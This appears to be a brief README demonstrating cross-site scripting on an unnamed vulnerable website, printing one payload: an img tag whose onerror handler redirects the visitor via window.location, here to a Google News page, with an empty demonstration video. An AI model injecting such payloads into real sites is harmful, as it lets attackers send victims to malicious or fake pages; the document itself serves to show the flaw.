# xss
Just a simple example of xss on a vulnerable website, in the example below, 
when the link is accessed, it is possible to redirect the person to a malicious page or even a fake page.

<h2>Used payload:</h2>
<code>&lt;img src="x"onerror=window.location="https://news.google.com/topstories?hl=pt-PT&gl=PT&ceid=PT:pt-150"&gt;
</code>

<h2>Demonstration : </h2>
<video></video>





